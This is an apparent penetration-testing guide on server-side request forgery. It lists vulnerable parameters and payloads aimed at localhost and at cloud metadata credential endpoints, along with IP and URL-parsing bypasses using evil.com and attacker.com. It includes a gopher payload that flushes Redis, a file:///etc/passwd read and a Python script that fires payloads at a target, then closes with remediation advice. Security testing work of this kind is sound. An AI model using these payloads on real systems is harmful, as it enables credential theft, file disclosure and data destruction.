# SSRF Testing Methodology

## Overview
Server-Side Request Forgery (SSRF) allows attackers to make the server send requests to unintended locations, potentially accessing internal services.

## Attack Vectors
- URL fetching features
- Webhooks
- PDF generators
- Image processors
- File imports

## Methodology

### 1. Identify SSRF-prone Parameters
- `url=`
- `link=`
- `src=`
- `path=`
- `file=`
- `callback=`
- `redirect=`
- `uri=`

### 2. Test for Basic SSRF
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
```

### 3. Test Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## Bypass Techniques

### IP Obfuscation
```
http://127.0.0.1 → http://0x7f000001
http://127.0.0.1 → http://2130706433
http://127.0.0.1 → http://127.1
http://127.0.0.1 → http://0177.0.0.1 (octal)
```

### URL Parsing Tricks
```
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1%00@evil.com
http://127.0.0.1?@evil.com
```

### DNS Rebinding
```
# Use DNS that resolves to internal IP after TTL
http://make-127-0-0-1-rr.1u.ms
```

### Protocol Smuggling
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/INFO
file:///etc/passwd
```

### Redirect Bypass
```
# Set up redirect from attacker server to internal
http://attacker.com/redirect?url=http://127.0.0.1
```

## Detection Methods

### Out-of-band Detection
```
# Use Burp Collaborator or webhook.site
http://<your-callback-server>/ssrf-test
```

### Blind SSRF Detection
- Response time differences
- Error message variations
- DNS lookups to controlled domain

## PoC Template
```python
import requests

def test_ssrf(url, param, payloads):
    """Test for SSRF vulnerabilities."""
    results = []
    
    for payload in payloads:
        try:
            response = requests.get(
                url,
                params={param: payload},
                timeout=10
            )
            
            # Check for indicators
            indicators = [
                "root:", "localhost", "127.0.0.1",
                "iam/security-credentials", "metadata"
            ]
            
            for indicator in indicators:
                if indicator in response.text:
                    results.append({
                        "vulnerable": True,
                        "payload": payload,
                        "indicator": indicator
                    })
                    break
                    
        except requests.exceptions.Timeout:
            results.append({
                "possible": True,
                "payload": payload,
                "note": "Request timed out - possible internal connection"
            })
    
    return results

# Common SSRF payloads
payloads = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0x7f000001",
]

results = test_ssrf("http://target.com/fetch", "url", payloads)
```

## Impact
- Access to internal services
- Cloud metadata exposure (credentials)
- Port scanning internal network
- Read local files (file://)
- Remote code execution (via protocols)

## Remediation
- Whitelist allowed domains
- Block private IP ranges
- Disable unnecessary protocols
- Use egress firewall rules
- Validate and sanitize URLs
